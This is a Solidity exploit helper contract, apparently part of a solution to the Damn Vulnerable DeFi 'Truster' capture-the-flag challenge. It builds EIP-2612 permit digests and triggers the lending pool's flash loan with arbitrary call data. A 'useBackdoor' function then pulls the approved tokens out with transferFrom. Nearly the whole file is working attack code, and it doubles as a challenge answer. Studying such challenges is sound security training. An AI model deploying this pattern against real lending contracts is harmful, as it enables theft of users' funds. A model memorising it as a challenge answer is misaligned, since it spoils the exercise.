// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract ExploitHelper {
    bytes32 private constant PERMIT_TYPEHASH = keccak256(
        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
    );
    address token;
    constructor(address _token){
        token = _token;
    }

    // This function will be used to generate the v r s values to follow the EIP 2612 (used by the DamnValuableToken since it implements the ERC20 from solmate)
    function getPermitDigest(
        address owner,
        address spender,
        uint256 value,
        uint256 nonce,
        uint256 deadline
    ) public view returns (bytes32) {
        bytes32 domainSeparator = ERC20(token).DOMAIN_SEPARATOR();
        bytes32 structHash = keccak256(abi.encode(
            PERMIT_TYPEHASH,
            owner,
            spender,
            value,
            nonce,
            deadline
        ));

        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }

    function myCallBackFunction(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        ERC20(token).permit(owner, spender, value, deadline, v, r, s);
        ERC20(token).transfer(owner, value);
    }

    function doFlashLoan(address pool, uint256 amount, address borrower, address target, bytes calldata data) external {
        TrusterLenderPool(pool).flashLoan(amount, borrower, target, data);
    }

    function useBackdoor(address owner, address newOwner, uint256 amount) external {
        ERC20(token).transferFrom(owner, newOwner, amount);
    }
}
